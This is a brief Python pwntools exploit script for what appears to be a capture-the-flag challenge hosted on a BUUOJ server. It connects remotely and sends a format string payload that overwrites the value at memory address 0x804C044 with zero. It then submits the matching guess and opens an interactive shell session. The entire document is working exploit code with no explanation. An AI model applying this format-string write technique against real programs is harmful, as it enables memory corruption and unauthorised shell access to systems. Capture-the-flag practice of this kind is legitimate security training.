from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28577)

payload = fmtstr_payload(10, {0x804C044: 0})
io.sendlineafter(b'your name:', payload)

io.sendline(b'0')
io.interactive()